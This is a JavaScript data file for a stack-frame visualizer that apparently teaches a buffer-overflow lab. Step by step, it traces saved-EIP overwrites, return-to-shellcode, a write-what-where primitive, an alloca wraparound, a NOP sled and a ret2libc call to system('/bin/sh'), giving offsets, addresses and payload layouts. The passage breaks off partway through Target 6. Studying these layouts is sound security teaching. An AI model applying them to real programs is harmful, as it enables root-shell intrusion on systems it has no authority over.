(function () {
  "use strict";

const DATA = {
    t0: {
      title: "Target 0 - stack view: name overflows into grade",
      subtitle: "A byte-range view of the GDB frame. ESP stays at the frame bottom; gets() temporarily pushes a return address below it.",
      rows: [
        { id: "eip",  addr: 0xfff6ba6c, size: 4,  label: "saved EIP", kind: "return" },
        { id: "ebp",  addr: 0xfff6ba68, size: 4,  label: "saved EBP", kind: "frame" },
        { id: "pad2", addr: 0xfff6ba60, size: 8,  label: "padding", kind: "pad" },
        { id: "grade",addr: 0xfff6ba5b, size: 5,  label: "grade[5]", kind: "buffer" },
        { id: "name", addr: 0xfff6ba51, size: 10, label: "name[10]", kind: "buffer" },
        { id: "pad1", addr: 0xfff6ba40, size: 17, label: "padding / ESP area", kind: "pad" },
        { id: "greg", addr: 0xfff6ba3c, size: 4,  label: "gets() return address", kind: "temp" }
      ],
      steps: [
        {
          title: "Main frame is ready",
          desc: "main's frame has EBP=0xfff6ba68. name lives at EBP-0x17 and grade at EBP-0xd. ESP=0xfff6ba40 is the current stack top.",
          code: "char grade[5]; char name[10];\nstrcpy(grade, \"nil\");\ngets(name);",
          asm: "0804a0b7  call gets",
          regs: { eip: "0x0804a0b7", esp: "0xfff6ba40", ebp: "0xfff6ba68" },
          values: { eip: "0x0804a05a", ebp: "0xffffdc08", pad2: "0x00000000", grade: "\"nil\"", name: "uninitialized", pad1: "stack space" }
        },
        {
          title: "Call gets(): the stack grows down",
          desc: "call pushes the return address at ESP-4 = 0xfff6ba3c. ESP moves down from 0xfff6ba40 to 0xfff6ba3c. This is the downward growth.",
          code: "gets(name);",
          asm: "0804a0b7  call _IO_gets",
          regs: { eip: "0x08057ee0", esp: "0xfff6ba3c", ebp: "0xfff6ba68" },
          values: { eip: "0x0804a05a", ebp: "0xffffdc08", pad2: "0x00000000", grade: "\"nil\"", name: "uninitialized", pad1: "stack space", greg: "0x0804a0bc" },
          highlight: ["greg"]
        },
        {
          title: "gets() writes name and then grade",
          desc: "The SID fills name[0..6], three NULs fill name[7..9], and the next bytes \"A+\" land at grade[0..1]. gets adds its own NUL after the payload.",
          code: "gets(name);  // 10 bytes of name, then grade",
          asm: "31 35 35 36 34 36 30 00 00 00 41 2b 00",
          regs: { eip: "0x08057ee0", esp: "0xfff6ba3c", ebp: "0xfff6ba68" },
          values: { eip: "0x0804a05a", ebp: "0xffffdc08", pad2: "0x00000000", grade: "\"A+\"", name: "\"1556460\"", pad1: "stack space", greg: "0x0804a0bc" },
          highlight: ["name", "grade"]
        },
        {
          title: "gets() returns: ESP moves back up",
          desc: "ret in gets pops the saved return address back into EIP, so ESP returns to 0xfff6ba40. The overwritten grade remains in memory.",
          code: "gets(name);  // returns",
          asm: "ret  ->  0x0804a0bc",
          regs: { eip: "0x0804a0bc", esp: "0xfff6ba40", ebp: "0xfff6ba68" },
          values: { eip: "0x0804a05a", ebp: "0xffffdc08", pad2: "0x00000000", grade: "\"A+\"", name: "\"1556460\"", pad1: "stack space" },
          highlight: ["grade"]
        },
        {
          title: "printf reads the changed grade",
          desc: "printf receives name and grade from the stack. The saved EIP at EBP+4 was never touched; only the grade data changed.",
          code: "printf(\"Hi %s! Your grade is %s.\\n\", name, grade);",
          asm: "0804a0d1  call printf",
          regs: { eip: "0x0804a0d1", esp: "0xfff6ba40", ebp: "0xfff6ba68" },
          values: { eip: "0x0804a05a", ebp: "0xffffdc08", pad2: "0x00000000", grade: "\"A+\"", name: "\"1556460\"", pad1: "stack space" }
        }
      ]
    },

    t1: {
      title: "Target 1 - stack view: saved EIP becomes print_good_grade",
      subtitle: "The 16-byte payload fills input, padding, and saved EBP. The next 4 bytes replace the saved return address.",
      rows: [
        { id: "eip",  addr: 0xfff6ba5c, size: 4,  label: "saved EIP", kind: "return" },
        { id: "ebp",  addr: 0xfff6ba58, size: 4,  label: "saved EBP", kind: "frame" },
        { id: "pad",  addr: 0xfff6ba50, size: 8,  label: "padding", kind: "pad" },
        { id: "input",addr: 0xfff6ba4c, size: 4,  label: "input[4]", kind: "buffer" },
        { id: "gap",  addr: 0xfff6ba30, size: 28, label: "frame gap / ESP area", kind: "pad" },
        { id: "greg", addr: 0xfff6ba2c, size: 4,  label: "gets() return address", kind: "temp" }
      ],
      steps: [
        {
          title: "vulnerable() frame",
          desc: "input starts at EBP-0xc = 0xfff6ba4c. The saved EIP is at EBP+4 = 0xfff6ba5c, exactly 16 bytes above input.",
          code: "char input[4];\ngets(input);",
          asm: "0804a165  lea edx,[ebp-0xc]",
          regs: { eip: "0x0804a165", esp: "0xfff6ba30", ebp: "0xfff6ba58" },
          values: { eip: "0x0804a18e", ebp: "0xfff6ba68", pad: "padding", input: "uninitialized", gap: "stack space" }
        },
        {
          title: "Call gets(): ESP moves down",
          desc: "call gets pushes its return address at ESP-4 = 0xfff6ba2c. ESP changes from 0xfff6ba30 to 0xfff6ba2c.",
          code: "gets(input);",
          asm: "0804a16b  call _IO_gets",
          regs: { eip: "0x08057f60", esp: "0xfff6ba2c", ebp: "0xfff6ba58" },
          values: { eip: "0x0804a18e", ebp: "0xfff6ba68", pad: "padding", input: "uninitialized", gap: "stack space", greg: "0x0804a170" },
          highlight: ["greg"]
        },
        {
          title: "gets() overwrites 16 bytes plus saved EIP",
          desc: "The 16 A bytes fill input[4], padding, and saved EBP. The following 23 a1 04 08 bytes replace saved EIP with print_good_grade.",
          code: "gets(input);  // 16 A's then 0x0804a123",
          asm: "41 x16  |  23 a1 04 08",
          regs: { eip: "0x08057f60", esp: "0xfff6ba2c", ebp: "0xfff6ba58" },
          values: { eip: "0x0804a123", ebp: "0xfff6ba68", pad: "41 41 41 41 41 41 41 41", input: "41 41 41 41", gap: "stack space", greg: "0x0804a170" },
          highlight: ["input", "pad", "eip"]
        },
        {
          title: "gets() returns",
          desc: "ESP moves back up to 0xfff6ba30. The overwritten return address stays at 0xfff6ba5c.",
          code: "gets(input);  // returns",
          asm: "ret  ->  0x0804a170",
          regs: { eip: "0x0804a170", esp: "0xfff6ba30", ebp: "0xfff6ba58" },
          values: { eip: "0x0804a123", ebp: "0xfff6ba68", pad: "41 41 41 41 41 41 41 41", input: "41 41 41 41", gap: "stack space" }
        },
        {
          title: "vulnerable() reaches ret",
          desc: "leave sets ESP=EBP and pops saved EBP. ESP now points at 0xfff6ba5c, the overwritten saved EIP slot.",
          code: "}  // vulnerable returns",
          asm: "0804a177 leave\n0804a178 ret",
          regs: { eip: "0x0804a178", esp: "0xfff6ba5c", ebp: "0xfff6ba58" },
          values: { eip: "0x0804a123", ebp: "0xfff6ba68", pad: "41 41 41 41 41 41 41 41", input: "41 41 41 41", gap: "stack space" },
          highlight: ["eip"]
        },
        {
          title: "ret jumps to print_good_grade",
          desc: "ret pops 0x0804a123 into EIP and moves ESP to 0xfff6ba60. Execution is now in print_good_grade, not print_bad_grade.",
          code: "print_good_grade();",
          asm: "ret  ->  0x0804a123 <print_good_grade>",
          regs: { eip: "0x0804a123", esp: "0xfff6ba60", ebp: "0xfff6ba58" },
          values: { eip: "0x0804a123", ebp: "0xfff6ba68", pad: "41 41 41 41 41 41 41 41", input: "41 41 41 41", gap: "stack space" },
          highlight: ["eip"]
        }
      ]
    },

    t2: {
      title: "Target 2 - stack view: return to shellcode at buf",
      subtitle: "The buffer is 112 bytes below the saved EIP. strcpy fills it with shellcode and padding, then ret jumps back to the start of buf.",
      rows: [
        { id: "eip",  addr: 0xfff6ba4c, size: 4,   label: "saved EIP", kind: "return" },
        { id: "ebp",  addr: 0xfff6ba48, size: 4,   label: "saved EBP", kind: "frame" },
        { id: "pad",  addr: 0xfff6ba40, size: 8,   label: "padding", kind: "pad" },
        { id: "buf",  addr: 0xfff6b9dc, size: 100, label: "buf[100]", kind: "buffer" },
        { id: "gap",  addr: 0xfff6b9c4, size: 24,  label: "gap / ESP area", kind: "pad" },
        { id: "sret", addr: 0xfff6b9c0, size: 4,   label: "strcpy() return address", kind: "temp" }
      ],
      steps: [
        {
          title: "vulnerable() frame",
          desc: "buf starts at EBP-0x6c = 0xfff6b9dc. The saved EIP is at EBP+4 = 0xfff6ba4c, so the offset is 112 bytes.",
          code: "char buf[100];\nstrcpy(buf, arg);",
          asm: "0804a04c  lea edx,[ebp-0x6c]",
          regs: { eip: "0x0804a04c", esp: "0xfff6b9c4", ebp: "0xfff6ba48" },
          values: { eip: "0x0804a0ad", ebp: "0xfff6ba68", pad: "padding", buf: "uninitialized (100 bytes)", gap: "stack space" }
        },
        {
          title: "Call strcpy(): stack grows down",
          desc: "call strcpy pushes its return address at ESP-4 = 0xfff6b9c0. ESP drops from 0xfff6b9c4 to 0xfff6b9c0.",
          code: "strcpy(buf, arg);",
          asm: "0804a052  call strcpy",
          regs: { eip: "0x08049020", esp: "0xfff6b9c0", ebp: "0xfff6ba48" },
          values: { eip: "0x0804a0ad", ebp: "0xfff6ba68", pad: "padding", buf: "uninitialized (100 bytes)", gap: "stack space", sret: "0x0804a057" },
          highlight: ["sret"]
        },
        {
          title: "strcpy overflows buf",
          desc: "The first bytes are shellcode. Padding brings the total to 112 bytes. The next word replaces saved EIP with 0xfff6b9dc, the buffer address.",
          code: "strcpy(buf, arg);  // shellcode + padding + &buf",
          asm: "31 db 8d 43 17 ...  |  dc b9 f6 ff",
          regs: { eip: "0x08049020", esp: "0xfff6b9c0", ebp: "0xfff6ba48" },
          values: { eip: "0xfff6b9dc", ebp: "0xfff6ba68", pad: "padding", buf: "shellcode at +0; A padding", gap: "stack space", sret: "0x0804a057" },
          highlight: ["buf", "eip"]
        },
        {
          title: "strcpy returns",
          desc: "ESP returns to 0xfff6b9c4. The buffer and overwritten saved EIP remain in memory.",
          code: "strcpy(buf, arg);  // returns",
          asm: "ret  ->  0x0804a057",
          regs: { eip: "0x0804a057", esp: "0xfff6b9c4", ebp: "0xfff6ba48" },
          values: { eip: "0xfff6b9dc", ebp: "0xfff6ba68", pad: "padding", buf: "shellcode at +0; A padding", gap: "stack space" }
        },
        {
          title: "leave; ret",
          desc: "leave sets ESP=EBP and pops saved EBP. ESP points at the overwritten saved EIP slot, which contains 0xfff6b9dc.",
          code: "}  // vulnerable returns",
          asm: "0804a05e leave\n0804a05f ret",
          regs: { eip: "0x0804a05e", esp: "0xfff6ba4c", ebp: "0xfff6ba48" },
          values: { eip: "0xfff6b9dc", ebp: "0xfff6ba68", pad: "padding", buf: "shellcode at +0; A padding", gap: "stack space" },
          highlight: ["eip"]
        },
        {
          title: "ret returns into the buffer",
          desc: "ret pops 0xfff6b9dc into EIP. ESP becomes 0xfff6ba50. The CPU now fetches the shellcode bytes from the executable stack.",
          code: "ret -> shellcode at buf",
          asm: "0xfff6b9dc: xor ebx,ebx  ; setuid(0)",
          regs: { eip: "0xfff6b9dc", esp: "0xfff6ba50", ebp: "0xfff6ba48" },
          values: { eip: "0xfff6b9dc", ebp: "0xfff6ba68", pad: "padding", buf: "shellcode executing", gap: "stack space" },
          highlight: ["buf", "eip"]
        }
      ]
    },

    t3: {
      title: "Target 3 - stack view: overflow a and p, then *p = a",
      subtitle: "strncpy writes 8 bytes past buf. Those bytes become a and p. The next instruction uses them as a write-what-where primitive.",
      rows: [
        { id: "eip",  addr: 0xfff6ba4c, size: 4,    label: "saved EIP", kind: "return" },
        { id: "ebp",  addr: 0xfff6ba48, size: 4,    label: "saved EBP", kind: "frame" },
        { id: "p",    addr: 0xfff6ba3c, size: 4,    label: "p (pointer)", kind: "count" },
        { id: "a",    addr: 0xfff6ba38, size: 4,    label: "a (value)", kind: "count" },
        { id: "buf",  addr: 0xfff6b238, size: 2048, label: "buf[2048]", kind: "buffer" },
        { id: "gap",  addr: 0xfff6b220, size: 24,   label: "gap / ESP area", kind: "pad" },
        { id: "sret", addr: 0xfff6b21c, size: 4,    label: "strncpy() return address", kind: "temp" }
      ],
      steps: [
        {
          title: "vulnerable() frame",
          desc: "buf starts at EBP-0x810 = 0xfff6b238. p is at EBP-0xc and a is at EBP-0x10. The saved EIP is at EBP+4 = 0xfff6ba4c.",
          code: "int *p; int a; char buf[2048];",
          asm: "0804a054  lea edx,[ebp-0x810]",
          regs: { eip: "0x0804a054", esp: "0xfff6b220", ebp: "0xfff6ba48" },
          values: { eip: "0x0804a0c0", ebp: "0xfff6ba68", p: "uninitialized", a: "uninitialized", buf: "uninitialized (2048 bytes)", gap: "stack space" }
        },
        {
          title: "Call strncpy(): ESP moves down",
          desc: "call strncpy pushes its return address at 0xfff6b21c. ESP goes from 0xfff6b220 to 0xfff6b21c.",
          code: "strncpy(buf, arg, 2056);",
          asm: "0804a05d  call strncpy",
          regs: { eip: "0x08049058", esp: "0xfff6b21c", ebp: "0xfff6ba48" },
          values: { eip: "0x0804a0c0", ebp: "0xfff6ba68", p: "uninitialized", a: "uninitialized", buf: "uninitialized (2048 bytes)", gap: "stack space", sret: "0x0804a062" },
          highlight: ["sret"]
        },
        {
          title: "The extra 8 bytes land on a and p",
          desc: "The shellcode and padding fill all 2048 bytes of buf. The next 4 bytes set a=0xfff6b238. The next 4 set p=0xfff6ba4c, the saved EIP slot.",
          code: "strncpy(buf, arg, 2056);",
          asm: "a = 0xfff6b238  |  p = 0xfff6ba4c",
          regs: { eip: "0x08049058", esp: "0xfff6b21c", ebp: "0xfff6ba48" },
          values: { eip: "0x0804a0c0", ebp: "0xfff6ba68", p: "0xfff6ba4c", a: "0xfff6b238", buf: "shellcode + 2048 bytes", gap: "stack space", sret: "0x0804a062" },
          highlight: ["a", "p", "buf"]
        },
        {
          title: "strncpy returns",
          desc: "ESP returns to 0xfff6b220. The saved EIP is still the original 0x0804a0c0 at this point.",
          code: "strncpy(buf, arg, 2056);  // returns",
          asm: "ret  ->  0x0804a062",
          regs: { eip: "0x0804a062", esp: "0xfff6b220", ebp: "0xfff6ba48" },
          values: { eip: "0x0804a0c0", ebp: "0xfff6ba68", p: "0xfff6ba4c", a: "0xfff6b238", buf: "shellcode + 2048 bytes", gap: "stack space" }
        },
        {
          title: "Load p and a",
          desc: "mov eax,[ebp-0xc] loads p into EAX. mov edx,[ebp-0x10] loads a into EDX. The next instruction will write EDX to the address in EAX.",
          code: "*p = a;",
          asm: "0804a065 mov eax,[ebp-0xc]\n0804a068 mov edx,[ebp-0x10]",
          regs: { eip: "0x0804a06b", esp: "0xfff6b220", ebp: "0xfff6ba48", eax: "0xfff6ba4c", edx: "0xfff6b238" },
          values: { eip: "0x0804a0c0", ebp: "0xfff6ba68", p: "0xfff6ba4c", a: "0xfff6b238", buf: "shellcode + 2048 bytes", gap: "stack space" },
          highlight: ["p", "a"]
        },
        {
          title: "The controlled write changes saved EIP",
          desc: "mov [eax],edx writes a to *p. Because p points at 0xfff6ba4c, the saved EIP slot now contains 0xfff6b238, the shellcode address.",
          code: "*p = a;  // *(saved-eip-slot) = shellcode",
          asm: "0804a06b mov [eax],edx",
          regs: { eip: "0x0804a06d", esp: "0xfff6b220", ebp: "0xfff6ba48", eax: "0xfff6ba4c", edx: "0xfff6b238" },
          values: { eip: "0xfff6b238", ebp: "0xfff6ba68", p: "0xfff6ba4c", a: "0xfff6b238", buf: "shellcode + 2048 bytes", gap: "stack space" },
          highlight: ["eip"]
        },
        {
          title: "leave; ret to shellcode",
          desc: "leave moves ESP to the saved EIP slot. ret pops 0xfff6b238 into EIP, so execution jumps to the start of buf.",
          code: "}  // vulnerable returns",
          asm: "0804a071 leave\n0804a072 ret",
          regs: { eip: "0x0804a072", esp: "0xfff6ba4c", ebp: "0xfff6ba48" },
          values: { eip: "0xfff6b238", ebp: "0xfff6ba68", p: "0xfff6ba4c", a: "0xfff6b238", buf: "shellcode + 2048 bytes", gap: "stack space" },
          highlight: ["eip"]
        },
        {
          title: "Shellcode executes",
          desc: "EIP is now 0xfff6b238 and ESP is 0xfff6ba50. The first instruction at buf is xor ebx,ebx, the beginning of setuid(0).",
          code: "ret -> shellcode at buf",
          asm: "0xfff6b238: xor ebx,ebx",
          regs: { eip: "0xfff6b238", esp: "0xfff6ba50", ebp: "0xfff6ba48" },
          values: { eip: "0xfff6b238", ebp: "0xfff6ba68", p: "0xfff6ba4c", a: "0xfff6b238", buf: "shellcode executing", gap: "stack space" },
          highlight: ["buf"]
        }
      ]
    },

    t4: {
      title: "Target 4 - stack view: zero-size alloca and file-driven overflow",
      subtitle: "The count wraps to zero, so buf points at ESP. The reader still loops over the huge count and writes word after word upward through saved EBP and saved EIP.",
      rows: [
        { id: "w11", addr: 0xfff6ba4c, size: 4, label: "word 11 / saved EIP", kind: "return" },
        { id: "w10", addr: 0xfff6ba48, size: 4, label: "word 10 / saved EBP", kind: "frame" },
        { id: "w9",  addr: 0xfff6ba44, size: 4, label: "word 9", kind: "buffer" },
        { id: "w8",  addr: 0xfff6ba40, size: 4, label: "word 8", kind: "buffer" },
        { id: "w7",  addr: 0xfff6ba3c, size: 4, label: "word 7", kind: "buffer" },
        { id: "w6",  addr: 0xfff6ba38, size: 4, label: "word 6", kind: "buffer" },
        { id: "w5",  addr: 0xfff6ba34, size: 4, label: "word 5 / count variable", kind: "count" },
        { id: "w4",  addr: 0xfff6ba30, size: 4, label: "word 4", kind: "buffer" },
        { id: "w3",  addr: 0xfff6ba2c, size: 4, label: "word 3", kind: "buffer" },
        { id: "w2",  addr: 0xfff6ba28, size: 4, label: "word 2", kind: "buffer" },
        { id: "w1",  addr: 0xfff6ba24, size: 4, label: "word 1", kind: "buffer" },
        { id: "w0",  addr: 0xfff6ba20, size: 4, label: "word 0 / buf start", kind: "buffer" },
        { id: "gap", addr: 0xfff6ba10, size: 16, label: "ESP area after read_elements", kind: "pad" }
      ],
      steps: [
        {
          title: "read_file() frame",
          desc: "read_file has EBP=0xfff6ba48. count is at EBP-0x14. The buffer will be placed at ESP=0xfff6ba20 after alloca. The saved EIP is at 0xfff6ba4c.",
          code: "unsigned int count;\nunsigned int *buf = alloca(count * 4);",
          asm: "0804a181  before call read_elements",
          regs: { eip: "0x0804a181", esp: "0xfff6ba20", ebp: "0xfff6ba48" },
          values: { w11: "0x0804a1eb", w10: "0xfff6ba68", w5: "uninitialized count" }
        },
        {
          title: "Read the count from the file",
          desc: "The first 4 file bytes load count = 0x40000000. That value is huge, but the next multiplication will wrap.",
          code: "fread(&count, 4, 1, f);",
          asm: "count = 0x40000000",
          regs: { eip: "0x0804a149", esp: "0xfff6ba20", ebp: "0xfff6ba48" },
          values: { w11: "0x0804a1eb", w10: "0xfff6ba68", w5: "0x40000000" },
          highlight: ["w5"]
        },
        {
          title: "count * 4 wraps to zero",
          desc: "shl eax,2 produces 0x00000000 because 0x40000000*4 does not fit in 32 bits. alloca(0) does not move ESP, so buf remains 0xfff6ba20.",
          code: "alloca(count * sizeof(unsigned int));",
          asm: "0804a14c shl eax,2\n0804a16b sub esp,eax",
          regs: { eip: "0x0804a181", esp: "0xfff6ba20", ebp: "0xfff6ba48" },
          values: { w11: "0x0804a1eb", w10: "0xfff6ba68", w5: "0x40000000" },
          highlight: ["w5"]
        },
        {
          title: "The reader starts writing words",
          desc: "read_elements still receives count=0x40000000. It reads words from the file and writes them at buf+0, buf+4, and so on. The stack region is overwritten upward.",
          code: "read_elements(f, buf, count);",
          asm: "0804a0c7 call fread",
          regs: { eip: "0x0804a0b0", esp: "0xfff6ba20", ebp: "0xfff6ba48" },
          values: { w11: "0x0804a1eb", w10: "0xfff6ba68", w5: "0x90909090", w4: "0x90909090", w3: "0x90909090", w2: "0x90909090", w1: "0x90909090", w0: "0x90909090" },
          highlight: ["w0", "w1", "w2", "w3", "w4"]
        },
        {
          title: "More words overwrite saved EBP",
          desc: "The NOP words continue upward. Word 10 lands on saved EBP at 0xfff6ba48. The count variable at word 5 has already been overwritten, but read_elements keeps using its own count argument.",
          code: "for (i=0; i < count; i++) fread(&buf[i], 4, 1, f);",
          asm: "word 10 -> saved EBP",
          regs: { eip: "0x0804a0b0", esp: "0xfff6ba20", ebp: "0xfff6ba48" },
          values: { w11: "0x0804a1eb", w10: "0x90909090", w9: "0x90909090", w8: "0x90909090", w7: "0x90909090", w6: "0x90909090", w5: "0x90909090", w4: "0x90909090", w3: "0x90909090", w2: "0x90909090", w1: "0x90909090", w0: "0x90909090" },
          highlight: ["w10"]
        },
        {
          title: "Word 11 replaces saved EIP",
          desc: "The 12th word, index 11, lands at 0xfff6ba4c and replaces saved EIP with 0xfff6bb5c, the middle of the NOP sled.",
          code: "payload[11] = 0xfff6bb5c;",
          asm: "word 11 -> saved EIP",
          regs: { eip: "0x0804a0b0", esp: "0xfff6ba20", ebp: "0xfff6ba48" },
          values: { w11: "0xfff6bb5c", w10: "0x90909090", w9: "0x90909090", w8: "0x90909090", w7: "0x90909090", w6: "0x90909090", w5: "0x90909090", w4: "0x90909090", w3: "0x90909090", w2: "0x90909090", w1: "0x90909090", w0: "0x90909090" },
          highlight: ["w11"]
        },
        {
          title: "read_elements returns",
          desc: "GDB shows ESP=0xfff6ba10 after the call. The overflowed words stay on the stack, including the new saved EIP.",
          code: "read_elements(...);  // returns",
          asm: "0804a193 after call",
          regs: { eip: "0x0804a193", esp: "0xfff6ba10", ebp: "0xfff6ba48" },
          values: { w11: "0xfff6bb5c", w10: "0x90909090", w9: "0x90909090", w8: "0x90909090", w7: "0x90909090", w6: "0x90909090", w5: "0x90909090", w4: "0x90909090", w3: "0x90909090", w2: "0x90909090", w1: "0x90909090", w0: "0x90909090", gap: "return area" }
        },
        {
          title: "read_file returns to the NOP sled",
          desc: "ret pops 0xfff6bb5c into EIP. ESP becomes 0xfff6ba50. The CPU lands in the NOP sled and slides into the shellcode.",
          code: "ret -> 0xfff6bb5c",
          asm: "0804a19d ret",
          regs: { eip: "0xfff6bb5c", esp: "0xfff6ba50", ebp: "0xfff6ba48" },
          values: { w11: "0xfff6bb5c", w10: "0x90909090", w9: "0x90909090", w8: "0x90909090", w7: "0x90909090", w6: "0x90909090", w5: "0x90909090", w4: "0x90909090", w3: "0x90909090", w2: "0x90909090", w1: "0x90909090", w0: "0x90909090", gap: "return area" },
          highlight: ["w11"]
        }
      ]
    },

    t5: {
      title: "Target 5 - stack view: ret2libc instead of stack shellcode",
      subtitle: "The saved EIP becomes system, the next word is system's fake return address, and the next word is the /bin/sh argument.",
      rows: [
        { id: "arg",  addr: 0xfff6ba54, size: 4,  label: "system argument (/bin/sh)", kind: "count" },
        { id: "fake", addr: 0xfff6ba50, size: 4,  label: "fake return for system", kind: "count" },
        { id: "eip",  addr: 0xfff6ba4c, size: 4,  label: "saved EIP", kind: "return" },
        { id: "ebp",  addr: 0xfff6ba48, size: 4,  label: "saved EBP", kind: "frame" },
        { id: "pad",  addr: 0xfff6ba40, size: 8,  label: "padding", kind: "pad" },
        { id: "buf",  addr: 0xfff6ba36, size: 10, label: "buf[10]", kind: "buffer" },
        { id: "gap",  addr: 0xfff6ba24, size: 18, label: "gap / ESP area", kind: "pad" },
        { id: "sret", addr: 0xfff6ba20, size: 4,  label: "strcpy() return address", kind: "temp" }
      ],
      steps: [
        {
          title: "vulnerable() frame",
          desc: "buf starts at EBP-0x12 = 0xfff6ba36. The saved EIP is at EBP+4 = 0xfff6ba4c. The distance is 22 bytes, not 20.",
          code: "char buf[10];\nstrcpy(buf, arg);",
          asm: "0804a077 lea edx,[ebp-0x12]",
          regs: { eip: "0x0804a077", esp: "0xfff6ba24", ebp: "0xfff6ba48" },
          values: { eip: "0x0804a0e7", ebp: "0xfff6ba68", pad: "padding", buf: "uninitialized (10 bytes)", gap: "stack space" }
        },
        {
          title: "Call strcpy(): ESP moves down",
          desc: "call strcpy pushes its return address at 0xfff6ba20. ESP changes from 0xfff6ba24 to 0xfff6ba20.",
          code: "strcpy(buf, arg);",
          asm: "0804a07d call strcpy",
          regs: { eip: "0x08049020", esp: "0xfff6ba20", ebp: "0xfff6ba48" },
          values: { eip: "0x0804a0e7", ebp: "0xfff6ba68", pad: "padding", buf: "uninitialized (10 bytes)", gap: "stack space", sret: "0x0804a082" },
          highlight: ["sret"]
        },
        {
          title: "The ret2libc payload overwrites the return area",
          desc: "22 A bytes fill buf and padding. Saved EIP becomes system (0x08051520). The next word is the fake return 0xdeadbeef, then the /bin/sh pointer 0x080b884d.",
          code: "payload = 22*A + system + deadbeef + &/bin/sh",
          asm: "20 15 05 08 | ef be ad de | 4d 88 0b 08",
          regs: { eip: "0x08049020", esp: "0xfff6ba20", ebp: "0xfff6ba48" },
          values: { arg: "0x080b884d (/bin/sh)", fake: "0xdeadbeef", eip: "0x08051520 (system)", ebp: "0xfff6ba68", pad: "padding", buf: "22 A bytes", gap: "stack space", sret: "0x0804a082" },
          highlight: ["buf", "eip", "fake", "arg"]
        },
        {
          title: "strcpy returns",
          desc: "ESP returns to 0xfff6ba24. The overwritten return area remains in memory.",
          code: "strcpy(buf, arg);  // returns",
          asm: "ret -> 0x0804a082",
          regs: { eip: "0x0804a082", esp: "0xfff6ba24", ebp: "0xfff6ba48" },
          values: { arg: "0x080b884d (/bin/sh)", fake: "0xdeadbeef", eip: "0x08051520 (system)", ebp: "0xfff6ba68", pad: "padding", buf: "22 A bytes", gap: "stack space" }
        },
        {
          title: "leave; ret",
          desc: "leave sets ESP to 0xfff6ba4c. ret is about to pop the overwritten saved EIP, which is the address of system.",
          code: "}  // vulnerable returns",
          asm: "0804a089 leave\n0804a08a ret",
          regs: { eip: "0x0804a08a", esp: "0xfff6ba4c", ebp: "0xfff6ba48" },
          values: { arg: "0x080b884d (/bin/sh)", fake: "0xdeadbeef", eip: "0x08051520 (system)", ebp: "0xfff6ba68", pad: "padding", buf: "22 A bytes", gap: "stack space" },
          highlight: ["eip"]
        },
        {
          title: "system() entry",
          desc: "ret popped system into EIP, so ESP is now 0xfff6ba50. system reads [ESP] as its return address and [ESP+4] as its argument: /bin/sh.",
          code: "system(\"/bin/sh\");",
          asm: "0804a08a ret -> 0x08051520 <system>",
          regs: { eip: "0x08051520", esp: "0xfff6ba50", ebp: "0xfff6ba48" },
          values: { arg: "0x080b884d (/bin/sh)", fake: "0xdeadbeef", eip: "0x08051520 (system)", ebp: "0xfff6ba68", pad: "padding", buf: "22 A bytes", gap: "stack space" },
          highlight: ["fake", "arg"]
        },
        {
          title: "Root shell",
          desc: "system executes /bin/sh. When the shell exits it returns to 0xdeadbeef and crashes, which is allowed. DEP did not matter because system was already executable.",
          code: "system(\"/bin/sh\");",
          asm: "execve(\"/bin/sh\", ...)",
          regs: { eip: "0x08051520", esp: "0xfff6ba50", ebp: "0xfff6ba48" },
          values: { arg: "0x080b884d (/bin/sh)", fake: "0xdeadbeef", eip: "0x08051520 (system)", ebp: "0xfff6ba68", pad: "padding", buf: "22 A bytes", gap: "stack space" }
        }
      ]
    },

    t6: {
      title: "Target 6 - stack view: MINIASLR and the 900-byte NOP sled",
      subtitle: "Representative GDB run: buf=0xfff6b550, EBP=0xfff6b958. The return address 0xfff6b7c8 lands 632 bytes into the sled for this run.",
      rows: [
        { id: "eip",  addr: 0xfff6b95c, size: 4,    label: "saved EIP", kind: "return" },
        { id: "ebp",  addr: 0xfff6b958, size: 4,    label: "saved EBP", kind: "frame" },
        { id: "pad",  addr: 0xfff6b950, size: 8,    label: "padding", kind: "pad" },
        { id: "buf",  addr: 0xfff6b550, size: 1024, label: "buf[1024]", kind: "buffer" },
        { id: "gap",  addr: 0xfff6b544, size: 12,   label: "gap / ESP area", kind: "pad" },
        { id: "sret", addr: 0xfff6b540, size: 4,    label: "strcpy() return address", kind: "temp" }
      ],
      steps: [
        {
          title: "vulnerable() frame",
          desc: "buf starts at EBP-0x408 = 0xfff6b550 in this run. The saved EIP is at EBP+4 = 0xfff6b95c, so the offset is 0x408 + 4 = 1036 bytes.",
          code: "char buf[1024];\nstrcpy(buf, arg);",
          asm: "0804a06b lea edx,[ebp-0x408]",
          regs: { eip: "0x0804a06b", esp: "0xfff6b544", ebp: "0xfff6b958" },
          values: { eip: "0x0804a0d1", ebp: "0xfff6b978", pad: "padding", buf: "uninitialized (1024 bytes)", gap: "stack space" }
        },
        {
          title: "Call strcpy(): ESP moves down",
          desc: "call strcpy pushes its return address at 0xfff6b540. ESP changes from 0xfff6b544 to 0xfff6b540.",
          code: "strcpy(buf, arg);",
          asm: "0804a074 call strcpy",
          regs: { eip: "0x08049020", esp: "0xfff6b540", ebp: "0xfff6b958" },
          values: { eip: "0x0804a0d1", ebp: "0xfff6b978", pad: "padding", buf: "uninitialized (1024 bytes)", gap: "stack space", sret: "0x0804a079" },
          highlight: ["sret"]
        },
        {
          title: "The overflow writes the NOP sled and return address",
          desc: "The first 900 bytes are 0x90 NOPs. Shellcode starts at offset 900. The saved EIP at offset 1036 becomes 0xfff6b7c8.",
          code: "900*NOP + shellcode + NOP filler + 0xfff6b7c8",
          asm: "offset 900: shellcode\noffset 1036: c8 b7 f6 ff",
          regs: { eip: "0x08049020", esp: "0xfff6b540", ebp: "0xfff6b958" },
          values: { eip: "0xfff6b7c8", ebp: "0xfff6b978", pad: "padding", buf: "900 NOPs + shellcode at 900", gap: "stack space", sret: "0x0804a079" },
          highlight: ["buf", "eip"]
        },
        {
          title: "strcpy returns",
          desc: "ESP returns to 0xfff6b544. The buffer and saved EIP are overwritten and stay in memory.",
          code: "strcpy(buf, arg);  // returns",
          asm: "ret -> 0x0804a079",
          regs: { eip: "0x0804a079", esp: "0xfff6b544", ebp: "0xfff6b958" },
          values: { eip: "0xfff6b7c8", ebp: "0xfff6b978", pad: "padding", buf: "900 NOPs + shellcode at 900", gap: "stack space" }
        },
        {
          title: "leave; ret",
          desc: "leave sets ESP to 0xfff6b95c. ret is about to pop 0xfff6b7c8 into EIP.",
          code: "}  // vulnerable returns",
          asm: "0804a080 leave\n0804a081 ret",
          regs: { eip: "0x0804a081", esp: "0xfff6b95c", ebp: "0xfff6b958" },
